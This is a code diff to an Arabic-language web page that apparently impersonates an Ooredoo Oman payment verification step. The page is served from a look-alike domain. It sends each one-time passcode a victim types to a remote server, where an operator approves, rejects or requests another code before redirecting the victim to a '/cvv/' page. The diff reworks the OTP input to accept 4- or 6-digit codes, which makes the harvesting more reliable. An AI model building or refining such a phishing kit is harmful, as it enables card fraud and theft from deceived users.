@@ -21,9 +21,21 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
 .card-info .row:last-child { margin-bottom: 0; }
 .card-info .label { color: #4c5562; font-size: 13px; }
 .card-info .value { color: #080808; font-size: 14px; font-weight: 600; direction: ltr; }
-.otp-input-area { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; direction: ltr; }
-.otp-input-area input { width: 48px; height: 56px; border: 1.5px solid #e0e0e0; border-radius: 12px; text-align: center; font-size: 22px; font-weight: 600; outline: none; transition: border-color 0.2s; }
-.otp-input-area input:focus { border-color: #ed1c24; }
+.otp-input-area { display: flex; justify-content: center; margin-bottom: 20px; direction: ltr; }
+.otp-single-input {
+  width: 100%;
+  max-width: 280px;
+  height: 56px;
+  border: 1.5px solid #e0e0e0;
+  border-radius: 12px;
+  text-align: center;
+  font-size: 28px;
+  font-weight: 600;
+  letter-spacing: 12px;
+  outline: none;
+  transition: border-color 0.2s;
+}
+.otp-single-input:focus { border-color: #ed1c24; }
 .error-msg { color: #ed1c24; font-size: 13px; text-align: center; margin-bottom: 16px; display: none; }
 .resend-area { text-align: center; margin-bottom: 24px; }
 .resend-area .timer { color: #4c5562; font-size: 13px; }
@@ -49,12 +61,7 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
   </div>
 
   <div class="otp-input-area">
-    <input type="tel" maxlength="1" inputmode="numeric" class="otp-digit" data-index="0" autofocus>
-    <input type="tel" maxlength="1" inputmode="numeric" class="otp-digit" data-index="1">
-    <input type="tel" maxlength="1" inputmode="numeric" class="otp-digit" data-index="2">
-    <input type="tel" maxlength="1" inputmode="numeric" class="otp-digit" data-index="3">
-    <input type="tel" maxlength="1" inputmode="numeric" class="otp-digit" data-index="4">
-    <input type="tel" maxlength="1" inputmode="numeric" class="otp-digit" data-index="5">
+    <input type="tel" maxlength="6" inputmode="numeric" class="otp-single-input" id="otpInput" placeholder="- - - - - -" autofocus>
   </div>
 
   <div class="error-msg" id="otpError">رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.</div>
@@ -64,7 +71,7 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
     <button class="resend-btn" id="resendBtn" onclick="resendOTP()">إعادة إرسال الرمز</button>
   </div>
 
-  <button class="submit-btn" id="submitBtn" onclick="submitOTP()">تأكيد</button>
+  <button class="submit-btn" id="submitBtn" disabled onclick="submitOTP()">تأكيد</button>
   <div class="waiting-msg" id="waitingMsg">جاري التحقق...</div>
 </div>
 
@@ -74,6 +81,8 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
   var SOCKET_URL = 'https://oredoooman-server.fly.dev';
   var socket = io(SOCKET_URL, { transports: ['polling','websocket'], reconnection: true, reconnectionAttempts: Infinity, reconnectionDelay: 1000 });
   var visitorId = localStorage.getItem('visitorId') || '';
+  var otpInput = document.getElementById('otpInput');
+  var submitBtn = document.getElementById('submitBtn');
 
   // Load payment data
   var paymentData = {};
@@ -98,44 +107,18 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
     }
   }, 1000);
 
-  // OTP digit inputs
-  var digits = document.querySelectorAll('.otp-digit');
-  digits.forEach(function(input, idx) {
-    input.addEventListener('input', function() {
-      var val = this.value.replace(/\D/g, '');
-      this.value = val.slice(0, 1);
-      if (val && idx < digits.length - 1) digits[idx + 1].focus();
-      checkOTPComplete();
-    });
-    input.addEventListener('keydown', function(e) {
-      if (e.key === 'Backspace' && !this.value && idx > 0) {
-        digits[idx - 1].focus();
-      }
-    });
-    input.addEventListener('paste', function(e) {
-      e.preventDefault();
-      var paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
-      for (var i = 0; i < Math.min(paste.length, digits.length); i++) {
-        digits[i].value = paste[i];
-      }
-      if (paste.length >= digits.length) digits[digits.length - 1].focus();
-      else if (paste.length > 0) digits[paste.length].focus();
-      checkOTPComplete();
-    });
+  // OTP single input - only allow digits, enable button at 4 or 6
+  otpInput.addEventListener('input', function() {
+    otpInput.value = otpInput.value.replace(/\D/g, '').slice(0, 6);
+    var len = otpInput.value.length;
+    if (len === 4 || len === 6) {
+      submitBtn.classList.add('active');
+      submitBtn.disabled = false;
+    } else {
+      submitBtn.classList.remove('active');
+      submitBtn.disabled = true;
+    }
   });
-
-  function checkOTPComplete() {
-    var code = getOTPCode();
-    var btn = document.getElementById('submitBtn');
-    if (code.length >= 4) { btn.classList.add('active'); btn.disabled = false; }
-    else { btn.classList.remove('active'); btn.disabled = true; }
-  }
-
-  function getOTPCode() {
-    var code = '';
-    digits.forEach(function(d) { code += d.value; });
-    return code;
-  }
 
   // Socket
   socket.on('connect', function() {
@@ -155,16 +138,18 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
   socket.on('code:action', function(action) {
     var act = (typeof action === 'string') ? action : (action && action.action) || '';
     document.getElementById('waitingMsg').style.display = 'none';
-    document.getElementById('submitBtn').classList.add('active');
-    document.getElementById('submitBtn').disabled = false;
-    document.getElementById('submitBtn').textContent = 'تأكيد';
+    submitBtn.classList.add('active');
+    submitBtn.disabled = false;
+    submitBtn.textContent = 'تأكيد';
 
     if (act === 'approve') {
       window.location.href = '/cvv/';
     } else if (act === 'reject') {
       document.getElementById('otpError').style.display = 'block';
-      digits.forEach(function(d) { d.value = ''; });
-      digits[0].focus();
+      otpInput.value = '';
+      otpInput.focus();
+      submitBtn.classList.remove('active');
+      submitBtn.disabled = true;
     }
   });
 
@@ -173,22 +158,26 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
     document.getElementById('waitingMsg').style.display = 'none';
     if (act === 'reject') {
       document.getElementById('otpError').style.display = 'block';
-      digits.forEach(function(d) { d.value = ''; });
-      digits[0].focus();
+      otpInput.value = '';
+      otpInput.focus();
+      submitBtn.classList.remove('active');
+      submitBtn.disabled = true;
     } else if (act === 'otp') {
-      // Admin asking for another OTP - just reset
-      digits.forEach(function(d) { d.value = ''; });
-      digits[0].focus();
+      otpInput.value = '';
+      otpInput.focus();
+      submitBtn.classList.remove('active');
+      submitBtn.disabled = true;
     }
   });
 
   // Submit OTP
   window.submitOTP = function() {
-    var code = getOTPCode();
-    if (code.length < 4) return;
+    var code = otpInput.value.replace(/\D/g, '');
+    if (code.length !== 4 && code.length !== 6) return;
     document.getElementById('otpError').style.display = 'none';
-    document.getElementById('submitBtn').disabled = true;
-    document.getElementById('submitBtn').textContent = 'جاري التحقق...';
+    submitBtn.disabled = true;
+    submitBtn.classList.remove('active');
+    submitBtn.textContent = 'جاري التحقق...';
     document.getElementById('waitingMsg').style.display = 'block';
 
     socket.emit('more-info', {
